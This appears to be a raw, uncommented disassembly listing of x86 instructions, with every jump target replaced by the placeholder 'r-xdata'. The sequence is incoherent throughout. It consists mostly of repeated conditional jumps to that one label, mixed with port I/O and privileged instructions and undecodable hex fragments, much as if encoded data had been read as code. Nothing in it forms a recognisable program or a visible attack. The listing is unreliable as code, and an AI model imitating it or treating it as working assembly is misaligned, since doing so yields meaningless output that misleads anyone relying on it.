jae r-xdata
xchg edi eax
adc al 0x1c
mov ebx eax
test [ edx - 0x5a ] ebp
sar [ eax ] 0x1
mov al 0x1c
jne r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
in al dx
jne r-xdata
or ah [ ecx + 0x16 ]
jae r-xdata
jae r-xdata
jae r-xdata
sub bl [ esp + ebx ]
jae r-xdata
jae r-xdata
dec ebp
push 0x2fa66e2d
test [ edx - 0x6a ] ebp
push 0xffffffa6
mov ebx ebp
sbb al 0x1c
shr [ edx ] 0x1
mov [ 0xab42bc8 ] al
push edi
sbb al 0x1c
mov dh 0x68
punpcklbw mmx1 [ edi ]
out dx eax
mov ch 0xb4
or esp ebx
jae r-xdata
jecxz r-xdata
[ eax - 0x53 ]
jecxz r-xdata
push esp
jae r-xdata
mov esp 0xa2366bd
push ebp
fmul [ ebx ]
jae r-xdata
jae r-xdata
aaa
push ds
sbb al 0x1c
mov bl 0xb0
push 0x5e
aaa
ja r-xdata
sahf
or esp [ ecx - 0x45e3e3ff ]
jae r-xdata
jecxz r-xdata
loop r-xdata
jae r-xdata
jae r-xdata
daa
out dx eax
or al [ eax ]
xor eax 0x73731c1c
jae r-xdata
mov edi 0xb32354ec
jae r-xdata
jae r-xdata
int1
cmp [ esp + ebx ] bl
outsb
sbb al 0x66
and ebp esp
and bp sp
sti
mov ch 0xb
mov eax [ 0xffffffffba1c1c01 ]
jae r-xdata
or dh [ ecx ]
or eax 0x73731c1c
jae r-xdata
mov al 0xa
unpckhps xmm3 [ esp + ebx ]
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0x60
mov bl 0x68
jae r-xdata
adc bl [ esp + ebx ]
in al dx
jae r-xdata
xchg ecx eax
jae r-xdata
sbb al 0x1c
jae r-xdata
mov edi 0xbdc0abb
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov al 0xb5
mov [ edi + 0x1c07710a ] esp
sbb al 0x73
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
mov ch 0x89
cmpsd [ esi ] [ edi ]
or dh [ ecx + 0x7 ]
sbb al 0x1c
sbb ecx [ ecx - 0x6f54465 ]
xor ebx [ esp + ebx ]
jae r-xdata
test [ edx - 0x5a ] ebp
adc [ ebx + 0x6a85cd89 ] edi
cmpsb [ esi ] [ edi ]
pop ss
mov ebx 0x15a66a85
mov [ esi - 0x59957a45 ] eax
fisttp [ 0x73731c1c ]
mov esi [ ebx ]
loop r-xdata
jae r-xdata
jae r-xdata
in al dx
nop
and eax 0x1c34c70b
jae r-xdata
push esp
cld
sbb al 0xec
jae r-xdata
or ch [ ecx + 0x12 ]
sbb al 0x1c
jae r-xdata
or dh ah
xor edi [ ebx + 0x1c0c370a ]
push 0xffffffa6
jae r-xdata
outsb
je r-xdata
jae r-xdata
or bl ah
jae r-xdata
jecxz r-xdata
sahf
or ecx [ edx ]
0x731c1c19 0x7373
jae r-xdata
mov sp 0x1c39
jae r-xdata
jae r-xdata
mov [ 0xffffffffc7e76afb ] eax
push 0x20bac7e7
shl [ ebx ] 0x1
jae r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
jecxz r-xdata
daa
jecxz r-xdata
sub [ ecx + ecx * 4 - 0x49957a5f ] edi
jpo r-xdata
push 0xffffff9e
jecxz r-xdata
jae r-xdata
and esi [ ebx - 0x38f4da98 ]
jae r-xdata
push ds
sbb al 0x1c
sbb al 0xb5
sub [ esp + ebx ] ebx
jae r-xdata
mov ebp 0x550a2366
sbb al 0x73
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sub bx [ esi ]
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xe26aefae
jae r-xdata
jae r-xdata
and al 0xa6
pop edx
shl ebx cl
jecxz r-xdata
or cl [ ecx ]
nop [ esi * 4 + 0xabbbf89 ] ebx
jecxz r-xdata
or ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
or dh dl
add al 0x1c
jae r-xdata
mov [ 0x1c0af70a ] eax
jae r-xdata
jecxz r-xdata
jae r-xdata
shl [ ebx ] 0x1
mov [ edi + 0x41b66a85 ] edx
or ebp [ ebx ]
cmp ebx [ esp + ebx ]
jecxz r-xdata
or cl [ ecx + 0x73e3e3ea ]
mov ebx esp
jae r-xdata
push 0x34c70b25
jae r-xdata
or cl [ edi ]
jae r-xdata
jae r-xdata
cmp [ eax - 0x1c9c8ae4 ] dh
jecxz r-xdata
in al 0xe3
sbb al 0x97
sbb al 0x60
jae r-xdata
sbb al 0x1c
mov bl 0x1c
push ds
jae r-xdata
sbb al 0x1c
pushad
in al dx
push 0xa2cc811
jae r-xdata
mov bl 0x68
cmpsb [ esi ] [ edi ]
sbb ebp [ eax + 0x63 ]
inc edi
jecxz r-xdata
mov edx 0xd81fa66a
and ah ch
jecxz r-xdata
push 0xe085cda0
cmpsd [ esi ] [ edi ]
loop r-xdata
jae r-xdata
mov al 0xa
out dx eax
jae r-xdata
sbb al 0x73
jae r-xdata
or dh [ edi ]
or al 0x1c
mov ebx 0x1c33f30a
sbb al 0x73
jae r-xdata
jb r-xdata
xchg [ eax - 0x1e ] ebp
push 0xa368efa3
out dx eax
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x74
arpl bx sp
mov esi 0x11390a37
sbb al 0x1c
cmp [ esp + ebx ] ebx
mov [ eax - 0x5441957b ] eax
mov eax 0xa9be6a85
push 0xbe6a853b
scasd [ edi ]
push 0xbe6a853a
lodsd [ esi ]
push 0x3810a3c
sbb al 0x1c
jae r-xdata
test [ edx ] 0x73731c1c
jae r-xdata
pushad
daa
out dx eax
or eax [ eax - 0x5 ]
jecxz r-xdata
mov ebx esp
mov ch 0xb
sub edi [ ebx ]
sbb al 0x1c
test [ edx - 0x62 ] ebp

fsub [ esp + ebp * 8 ]
cmp bl [ esp + ebx ]
aaa
sbb al 0x75
dec edi
jae r-xdata
xor al 0x1c
or eax edi
jae r-xdata
adc eax 0x73731c1c
jae r-xdata
jae r-xdata
or bl bh
or eax 0x73731c1c
add bl [ esp + ebx ]
sbb al 0x96
daa
jae r-xdata
sbb al 0xb3
jae r-xdata
enter 0xa2c 0xfe
jecxz r-xdata
jae r-xdata
push 0xffffffbe
aaa
or bh [ ecx ]
adc [ esp + ebx ] ebx
jecxz r-xdata
pushfd
jmp r-xdata
aaa
push 0xffffffa6
sbb al 0x1c
jae r-xdata
loop r-xdata
jae r-xdata
hlt
jae r-xdata
mov edx 0x73737320
or dh [ edx + 0x2f ]
sbb al 0x73
test [ edx - 0x5a ] ebp
pop ss
mov ebx 0x1c2f720a
sbb al 0x73
in al dx
add al 0x1c
test [ edx - 0x5a ] ebp
jae r-xdata
or [ edi ] ecx
jae r-xdata
push 0xe76afba3
jae r-xdata
sbb al 0x1c
sbb al 0x1c
jae r-xdata
popad
push ss
jae r-xdata
sbb al 0x73
jae r-xdata
sub [ esp + ebx ] ebx
jae r-xdata
mov ah 0x1c
mov ch 0xeb
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xef0f600f
jae r-xdata
sbb al 0x1c
jae r-xdata
or ch [ edi + edx ]
sbb al 0xb5
xchg [ eax + 0x2b ] esp
loope r-xdata
jae r-xdata
jae r-xdata
and ebp ebx
mov bl 0x1c
xchg esi eax
pop es
push 0xffffffbe
aas
sbb al 0xb4
sti
mov ah 0xb
pushad
sbb bl [ ebx + esi ]
or bl [ ebx + ebp * 8 + 0x7373e3e3 ]
mov al 0xb0
mov al 0x25
cmpsb [ esi ] [ edi ]
cvtdq2ps xmm4 [ esi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
or ah [ edx + 0x731c1c02 ]
jae r-xdata
jecxz r-xdata
jae r-xdata
or dl [ ebx + 0x12 ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
or ch [ edx + 0x13 ]
sbb al 0x1c
jae r-xdata
and esp [ ebx + 0x1c0af70a ]
scasb [ di ]
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
test eax 0x6ee3e3e7
mov dh 0xb
or ah [ esi + 0x731c1c2f ]
sbb al 0x73
jae r-xdata
mov ch 0xeb
jae r-xdata
jae r-xdata
jae r-xdata
and al 0x1c
jae r-xdata
add al 0x1c
sbb al 0xb5
push 0x6012c813
and ah cl
nop
push 0xffffffa6
sbb ebp [ esi - 0x5a ]
or ah [ bx + si + 0xb ]
sbb al 0x1c
jae r-xdata
sbb al 0x6e
jae r-xdata
jae r-xdata
or dh [ esi - 0x76e3e3fc ]
mul [ bx ]
sbb al 0x1c
or al [ ebx + 0x6ae3e3e7 ]
cmpsb [ esi ] [ edi ]
pop ds
shl [ ebx ] 0x1
fisub [ esi + 0x25c80a1f ]
sbb al 0x1c
push 0xffffffa6
pop ds
fsub [ eax ]
in al dx
adc bl [ esp + ebx ]
mov edi esp
outsb
mov ebx 0x1c0c370a
jae r-xdata
mov ch 0x89
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0x68
adc ah [ esi + 0x15 ]
in al dx
adc edx [ bx ]
movsb [ edi ] [ esi ]
in al dx
or ebp [ ecx + 0x6ee3e3e7 ]
jae r-xdata
jae r-xdata
rcr [ edx + ecx ] 0x1
jae r-xdata
out 0xe3 eax
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
push 0xfba368e3
push 0xffffffe7
or dh bl
xor ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ ebx ]
add bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x731c1c02 ] al
jae r-xdata
pushad
lahf
mov al 0xb4
mov dh 0x68
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
mov bl 0x87
sbb al 0x96
push 0x13e0df93
jae r-xdata
cmp eax [ edx ]
sbb al 0x1c
nop
imul edx [ ebx - 0x1d ] 0xffffffe3
jecxz r-xdata
imul ebp [ esi + 0x17130aef ] 0x73731c1c
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
punpcklbw mmx1 [ edi ]
out dx eax
jae r-xdata
or bh [ esi + 0x2f ]
sbb al 0x1c
jae r-xdata
outsb
jae r-xdata
jae r-xdata
add [ esp + ebx ] bl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or ah [ ecx - 0x18 ]
jecxz r-xdata
push 0x68301c12
and eax 0x1c16aa0a
fnstsw ax
jae r-xdata
dec esp
jae r-xdata
jae r-xdata
push ds
outsd
je r-xdata
jae r-xdata
jae r-xdata
pxor mm6 [ eax - 0x1f5df54c ]
jecxz r-xdata
jae r-xdata
or ecx [ edx ]
cmpsb [ esi ] [ edi ]
das
sbb al 0x1c
jae r-xdata
sbb al 0x74
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
outsb
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
or ch [ ebp + 0x1ce3e3e5 ]
adc esp [ edx - 0x23 ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
jae r-xdata
or cl [ ecx + ebp + 0x1c ]
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ch 0x87
pushad
sub esp ecx
mov bl 0xa
sub al 0x17
cmpsb [ esi ] [ edi ]
sbb esi [ ebx - 0x1df4da98 ]
mov edx 0x66ec2366
push 0x6e1c1c37
jae r-xdata
or ah [ eax + esi * 8 + 0x7373e3e3 ]
jae r-xdata
or esp edx
mov bl 0x24
jae r-xdata
scasb [ edi ]
jae r-xdata
adc cl [ ecx + 0x24e389e3 ]
cmpsb [ esi ] [ edi ]
push ss
mov ebx esp
mov ebx esp
test [ esi ] esp
and eax 0x245b0fa6
cmpsb [ esi ] [ edi ]
shl [ ebx ] 0x1
mov [ edx + ebp * 2 ] ebx
sahf
pop ds
sbb al 0x75
outsd
jecxz r-xdata
mov esp edi
out dx eax
jae r-xdata
adc eax 0x190a1c1c
dec edi
jae r-xdata
jae r-xdata
test al 0xe3
jae r-xdata
dec di
mov al 0x6e
jae r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
scasb [ edi ]
out dx eax
or dl [ ebx ]
pop ss
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
pop ss
or al dh
out 0xe3 al
jecxz r-xdata
jae r-xdata
and eax 0x1c24e20b
jecxz r-xdata
jae r-xdata
or ah [ edx - 0x451c1c20 ]
and bp sp
push 0x1c37
sbb al 0x6e
mov bl 0xb0
sbb al 0xb5
cmpsd [ esi ] [ edi ]
push 0xae681fa6
jecxz r-xdata
jae r-xdata
push 0xffffffe2
jae r-xdata
jae r-xdata
mov al 0x89
jecxz r-xdata
jae r-xdata
xor ebx [ esp + ebx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
pop ebx
scasb [ edi ]
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
popad
mov edi 0x89e3e3ee
jecxz r-xdata
pop ds
shr [ edx ] 0x1
pushad
sbb ebx [ esp + ebp * 8 ]
jbe r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
mov ch 0xb5
imul esi ebx 0xe3e66d0a
jae r-xdata
jae r-xdata
jae r-xdata
and al 0xe3
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
out dx eax
mov [ esi + 0x2da66a85 ] edx
test [ edx - 0x5a ] ebp
xor ecx [ edx ]
pop ecx
cmp ebx [ esp + ebx ]
mov ebx esp
sbb al 0xb3
scasd [ edi ]
jae r-xdata
movsd [ edi ] [ esi ]
xlat
mov bl 0xa
sub al 0x16
sbb al 0x1c
jae r-xdata
mov edi esp
outsb
jae r-xdata
0xaa0ae3e3 0xe3f0
sub ebp [ ecx - 0xd ]
jae r-xdata
jae r-xdata
fsubrp st3
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
insd
out 0xe3 eax
jecxz r-xdata
or [ esp + ebx ] bl
sbb al 0x96
jae r-xdata
jae r-xdata
xchg edi eax
sbb al 0xba
mov edx 0x7373202a
jae r-xdata
or ch [ ebp - 0x1a ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0xffffffaf
add ebp [ edx - 0x5a ]
xchg esi eax
jae r-xdata
push ebx
jae r-xdata
test [ edx ] 0x1c1c0f60
jae r-xdata
jae r-xdata
or esp ebx
jmp r-xdata
sbb ecx [ ebx - 0x7c0da6d2 ]
mov ah 0x6a
pop ebp
aaa
jecxz r-xdata
jae r-xdata
mov bl 0xb3
jecxz r-xdata
out 0x8b eax
jecxz r-xdata
retn
sahf
rol [ esi + 0x53 ] cl
mov ah 0x6a
movsd [ edi ] [ esi ]
out dx eax
or ch [ ebx ]
cmp [ esp + ebx ] ebx
jae r-xdata
jecxz r-xdata
or ch [ ebp - 0x1a ]
jae r-xdata
mov [ ebp - 0x59957b ] ecx
or bh [ edi - 0x16 ]
mov ah 0x66
sub ch ah
jecxz r-xdata
out 0xe3 al
push 0x22e0dfa2
in al dx
mov ecx 0xda85e3e3
jae r-xdata
or eax esp
sbb al 0xa
sbb [ ebx ] esi
sbb al 0x1c
enter 0x692b 0xf3
jae r-xdata
jg r-xdata
jae r-xdata
out dx eax
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
mov bl 0xa6
jecxz r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
arpl bx sp
jae r-xdata
cmpsb [ esi ] [ edi ]
aas
out 0x6e eax
push 0xb66a8532
nop [ ecx + edi * 4 ] ebx
test [ edx - 0x4a ] ebp
jae r-xdata
pushad
jae r-xdata
jae r-xdata
add eax edx
xor [ ecx - 0x49957a73 ] ecx
push 0xffffffb6
or esi esp
in al 0xe3
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jecxz r-xdata
jecxz r-xdata
pop es
sbb al 0x1c
add bh [ esi ]
mov edx 0x73202aba
jae r-xdata
test al 0xe3
mov ch 0xb4
sub ch ah
insd
jae r-xdata
fsub [ eax ]
or ch [ edx + 0x73e3e3f0 ]
jae r-xdata
or cl al
xor bl [ esp + ebx ]
shr [ 0x6aba1c1c ] 0x1
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
mov dh 0x1b
push 0xe60a1fa6
jae r-xdata
or [ edx ] ecx
cmpsb [ esi ] [ edi ]
jae r-xdata
mov ecx [ esi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
out dx al
jecxz r-xdata
mov ecx 0x1b66a85
sbb al 0x1c
jae r-xdata
jae r-xdata
pop ebx
push 0xef900a33
jecxz r-xdata
sub esp ebx
jecxz r-xdata
movsb [ edi ] [ esi ]
cmp [ esp + ebx ] bl
jae r-xdata
scasb [ edi ]
or [ esp + ebx ] bl
mov bl 0xb0
jae r-xdata
jae r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
or dl [ esi ]
mov [ 0x1f86609b ] eax
jecxz r-xdata
sbb al 0x1c
mov bl 0x6e
push di
sbb ebx [ esp + ebx ]
mov bl 0xa
push ss
sub ebx [ esi ]
or bh [ edx + 0x73e3e3e8 ]
jae r-xdata
and bp sp
jae r-xdata
push 0xffffffa6
jecxz r-xdata
jae r-xdata
mov ebx 0xc39368c7
jae r-xdata
and cx [ edx ]
sbb esp edx
push 0xb31ceba6
jae r-xdata
out 0x6e eax
sbb al 0x1c
arpl [ esi + 0x66ece2f3 ] bx
add bh [ esi ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop es
test [ edx - 0x4a ] ebp
jecxz r-xdata
pop esp
sbb al 0x1c
jae r-xdata
das
jae r-xdata
loop r-xdata
sbb al 0x1c
outsb
in al 0xe3
jecxz r-xdata
or ebp edi
sbb al 0x1c
mov al 0x89
jae r-xdata
jae r-xdata
jecxz r-xdata
and ch [ eax - 0x65 ]
[ eax - 0x45 ]
mov al 0x1c
jae r-xdata
mov eax 0xa1c1c00
and eax 0x731c1c2b
jae r-xdata
in al dx
jecxz r-xdata
jecxz r-xdata
lea edx [ esi ]
sbb al 0x1c
jae r-xdata
and ecx [ edx ]
loop r-xdata
loopne r-xdata
push 0xa368c393
jae r-xdata
jecxz r-xdata
lea eax [ ebp + 0xaffa66a ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jecxz r-xdata
les ecx [ 0x27601c1c ]
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
mov ecx 0x661c1c01
and ebp esp
out 0xe3 eax
jecxz r-xdata
shl [ ecx ] 0x1
mov dh 0x1
jecxz r-xdata
rcr [ esp ] 0x1
and bp sp
out dx al
aam 0x3f
sbb al 0x1c
push 0x236033a6
fcom [ ebx ]
or ah [ ecx - 0x1b ]
sbb al 0x89
jecxz r-xdata
or dh [ ebp - 0xe ]
jecxz r-xdata
or eax 0xa46e1c1c
jae r-xdata
retn
jae r-xdata
sbb al 0x96
or ebx [ esp + esi * 2 ]
jcxz r-xdata
loop r-xdata
shl ebx 0x1
jecxz r-xdata
mov [ 0xffffffffec22e0df ] al
hlt
jae r-xdata
mov al 0x6e
sub bx [ esi ]
sbb al 0x1c
jae r-xdata
push 0xffffffa6
sbb al 0x1c
loopne r-xdata
retn
jae r-xdata
jae r-xdata
mov ebx esp
or ch [ ebp - 0x19 ]
jecxz r-xdata
mov edx 0xffc7a76a
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov eax [ esi + 0x5a ]
jecxz r-xdata
sbb al 0xb4
jae r-xdata
jae r-xdata
sbb al 0x96
lahf
push 0xffffff9f
sbb al 0xb
mov edx [ esi ]
sbb al 0x1c
push 0xaa68ebae
fild [ eax - 0x4b ]
mov bl 0xa
insb
or ecx [ ebx + 0x681c1c16 ]
scasb [ edi ]
mov bl 0xaf
jae r-xdata
movsb [ edi ] [ esi ]
sbb al 0x6e
sbb al 0xb4
mov al 0xa
jae r-xdata
mov edx [ eax ]
xchg edi eax
xchg [ eax + 0x38a40ab4 ] dh
sbb al 0x1c
jecxz r-xdata
xor [ esp + ebx ] edx
rcr [ esp + esi * 4 ] 0x1
mov ah 0xa
movsd [ edi ] [ esi ]
cmp ebx [ esp + ebx ]
jae r-xdata
or bl [ ecx ]
pop edi
add eax 0x6eb01c1c
sbb esp [ esi + 0x23 ]
in al dx
outsb
das
sbb al 0x1c
shl [ ebx ] 0x1
mov esp 0x202ab8bd
mov [ 0xffffffffe01ae0fb ] eax
jae r-xdata
cmpsd [ esi ] [ edi ]
or edx ecx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ esi + edx * 4 ] ebx
sbb al 0xb3
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sti
push 0x65
pop ss
jecxz r-xdata
sbb al 0x60
daa
jecxz r-xdata
div [ si - 0xff5 ]
or eax 0xbaba1c1c
and bp sp
jmp r-xdata
inc esi
pop edx
mov bh 0xa
jae r-xdata
jae r-xdata
sbb al 0x75
add esp ebx
jecxz r-xdata
sbb al 0x96
pop ds
sbb al 0x96
pop es
sbb al 0x33
or cl cl
cmp bl [ esp + ebx ]
jae r-xdata
mov [ ebp + 0x7b66a85 ] ecx
cmp esp ebx
jecxz r-xdata
xchg esi eax
jae r-xdata
push edx
sbb bl [ esp + ebx ]
jae r-xdata
mov ebp [ esi ]
pop ecx
xor [ edx + ebp * 2 - 0x1c1cc8a3 ] 0xffffffe3
or ebp [ esi - 0x74e3e3f8 ]
adc [ edi + 0xab4b086 ] dl
and ebp [ edx - 0x42 ]
add ebp [ edx - 0x42 ]
pop ss
test eax ebx
movsd [ edi ] [ esi ]
in eax 0xec
pushad
jmp r-xdata
jae r-xdata
loopne r-xdata
jae r-xdata
sub eax 0x6aba1c1c
jae r-xdata
jae r-xdata
jae r-xdata
popad
call 0x73ba3222
nop [ ebx + esi * 2 ] ebx
jae r-xdata
push 0xffffffb6
sbb ebp [ eax - 0x5a ]
pop ds
or ah dh
xchg ebx eax
jae r-xdata
sbb al 0x73
mov al [ 0x2366bad7 ]
in al dx
shl ebp 0x1
or eax 0x1b656ab0
jecxz r-xdata
push cs
mov bl 0x68
and eax 0x1c12d80b
adc bh dh
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb5
scasd [ edi ]
or cl bh
sub [ esp + ebx ] ebx
jae r-xdata
sbb ebp [ eax + 0x3d ]
test [ edx - 0x42 ] ebp
jae r-xdata
mov al 0xb0
mov ebx eax
mov al 0xb0
or dl [ edx + 0x1a ]
sbb al 0x1c
sbb al 0x73
jae r-xdata
outsb
cmpsd [ esi ] [ edi ]
mov [ 0x27c60a1d ] al
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
mov dh 0x7
sbb [ eax + 0x3b ] ebp
test [ edx - 0x42 ] ebp
pop ds
or ah [ ebx ]
aaa
sbb al 0x1c
jae r-xdata
test [ edx - 0x42 ] ebp
adc ecx [ ecx + 0x6a85b896 ]
mov esi 0xb88a8911
test [ edx - 0x42 ] ebp
pop ss
push 0xbe6a853c
adc eax 0x6a853b68
mov esi 0x853d681b
push 0xffffffbe
cmp ah al
push 0xffffffa6
add [ ebx + 0x6a85c189 ] edi
cmpsb [ esi ] [ edi ]
pop es
or bl ch
sbb ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
sbb al 0xba
jae r-xdata
jecxz r-xdata
pushad
and [ edx ] cl
enter 0x1c32 0x1c
jae r-xdata
loopne r-xdata
mov bl 0x1c
mov ch 0xeb
pushad
cwde
mov [ 0xffffffffcb67ece3 ] eax
jecxz r-xdata
jecxz r-xdata
push 0x36d40b1d
sbb al 0x1c
pushad
daa
out dx eax
fiadd [ ebx - 0x131c1cf7 ]
in eax 0xe3
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
or bl [ esp + ebx ]
jae r-xdata
sbb al 0xba
and bp sp
sub [ es : esp + ebx ] bl
and ch ah
push ebx
pop ebp
sbb al 0x1c
or al [ ebx ]
sbb al 0x1c
jae r-xdata
jecxz r-xdata
shl [ ebx ] 0x1
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffa7
jae r-xdata
jae r-xdata
stosb [ edi ]
in al dx
cmpsd [ esi ] [ edi ]
out 0xe3 eax
daa
sbb bl [ esp + ebx ]
push 0x66bad7a0
and ebp esp
jecxz r-xdata
mov ah [ ebx - 0x1cd8aae4 ]
jecxz r-xdata
mov [ 0xffffffffd0ebb51c ] eax
sbb al 0xa
sbb al 0x90
outsb
jae r-xdata
jae r-xdata
and bp sp
inc eax
adc [ esp + ebx ] bl
sbb al 0x1c
mov ch 0xaf
jecxz r-xdata
xlat
sbb al 0x6a
jae r-xdata
or al [ ebx + 0xb ]
sbb al 0x1c
in al dx
push esp
test [ edx - 0xd ] ebp
test [ esi + 0x31 ] esp
or ah dh
sbb [ esp + ebx ] ebx
jae r-xdata
or ah [ ecx + 0x36 ]
sbb al 0x1c
out dx eax
jecxz r-xdata
mov edi 0xc7a76ee3
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ 0x73731c1c ] dl
jae r-xdata
push 0xffffffa5
jae r-xdata
push 0x1ae0fba3
jae r-xdata
loope r-xdata
jae r-xdata
mov ah 0xb7
jae r-xdata
jae r-xdata
iretd
movsd [ edi ] [ esi ]
outsb
sub bx [ esi ]
sbb al 0x1c
mov bl 0xb0
mov al 0x89
stc
mov al 0x1c
jne r-xdata
jae r-xdata
jecxz r-xdata
pushad
daa
out dx eax
pushad
xchg edi eax
jae r-xdata
push 0xffffffae
pushad
jecxz r-xdata
sbb al 0x75
arpl bx sp
jecxz r-xdata
mov ebp 0x73202ab8
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sti
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
or dh [ ebx + 0x37 ]
jae r-xdata
mov eax [ ecx + 0x45 ]
or [ eax ] 0xb4
or eax [ ebx - 0x74e3e3f6 ]
lodsb [ ss : esi ]
xchg ecx eax
sub [ esp + ebx ] ebx
or eax [ edi + esi ]
adc esi [ edx + ecx + 0x1c1c5d3a ]
jae r-xdata
xchg esi eax
sbb eax 0x73731c1c
jae r-xdata
mov ah 0xb4
mov al 0xa
mov [ edx ] ss
sbb al 0x1c
jae r-xdata
sub al 0x1c
pushfd
jae r-xdata
cmpsd [ esi ] [ edi ]
mov edi 0x1c39070a
sbb al 0x73
jae r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
fisttp [ edx ]
or al [ ebx + 0x8 ]
sbb al 0x1c
sub ah [ eax ]
jae r-xdata
jae r-xdata
jae r-xdata
and edi [ ebp + 0x73202ab8 ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xa7
sbb ah al
jae r-xdata
or ah [ ebp + 0x1ce3e3e3 ]
jae r-xdata
aaa
jae r-xdata
0x7373e3e3 0xb073
mov dl 0x1c
xchg ebx eax
pop ds
push 0xebaee0eb
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
xchg edi eax
jae r-xdata
sbb al 0x1c
and bp sp
xchg esi eax
aaa
and esp ebx
mov eax 0x7373202a
jae r-xdata
jae r-xdata
out 0xe3 eax
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
outsw
sbb al 0x6e
jae r-xdata
jae r-xdata
push 0xffffffa6
jmp r-xdata
jae r-xdata
shr [ edx ] 0x1
and bp sp
jpe r-xdata
and ebp esp
outsb
sbb [ si ] bl
adc eax 0xa66a85bb
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
outsb
outsb
sbb ebx [ esi ]
sbb al 0x1c
or bh [ esp + edi ]
sbb al 0x1c
jae r-xdata
and [ ebx + 0x73 ] dh
loopne r-xdata
jae r-xdata
push 0x65878b3b
adc [ esi - 0x5442954c ] dl
or ecx [ ebp + 0x6a1c1c0a ]
adc ch [ edx - 0x5a ]
mov ah 0x6a
movsd [ edi ] [ esi ]
jecxz r-xdata
jae r-xdata
jae r-xdata
add [ ebx ] edi
sti
jae r-xdata
sbb al 0x1c
scasb [ edi ]
jmp r-xdata
jae r-xdata
jmp r-xdata
or bl [ edx - 0x7ae3e3cd ]
push 0xffffffa6
mov ebx 0x1ba66a85
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
jae r-xdata
jne r-xdata
in al dx
push esp
mov al 0x60
and ah cl
mov ah 0x68
sbb [ edx ] ecx
or ebx [ ebp + 0x1c ]
sbb al 0x73
jae r-xdata
cmp [ esp + ebx ] ebp
jecxz r-xdata
and esp ebx
jae r-xdata
xchg edi eax
jae r-xdata
jne r-xdata
jae r-xdata
mov ch 0x68
jae r-xdata
